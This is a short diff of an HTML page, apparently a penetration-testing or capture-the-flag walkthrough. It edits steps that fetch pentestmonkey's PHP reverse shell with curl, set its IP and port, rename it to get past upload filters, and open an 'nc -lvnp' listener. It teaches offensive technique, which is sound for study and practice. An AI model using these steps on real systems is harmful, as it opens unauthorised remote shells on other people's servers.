@@ -138,7 +138,10 @@
 <p>First, download the script:</p>
 <pre><code>curl -LO https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
 </code></pre>
-<p>Change <code>ip</code> and <code>port</code> in the script (use <code>ip addr</code> for ip). Also probably rename, see <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/bypass_image_upload.html">Bypass File Upload Filtering</a>.</p>
+<p>Change <code>ip</code> and <code>port</code> in the script (use <code>ip addr</code> for ip, <code>port</code> can be anything that's available):</p>
+<pre><code>nano php-reverse-shell.php
+</code></pre>
+<p>Also probably rename, see <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/bypass_image_upload.html">Bypass File Upload Filtering</a>.</p>
 <p>Next, start <code>nc</code>:</p>
 <pre><code>nc -lvnp &lt;port&gt;
 </code></pre>
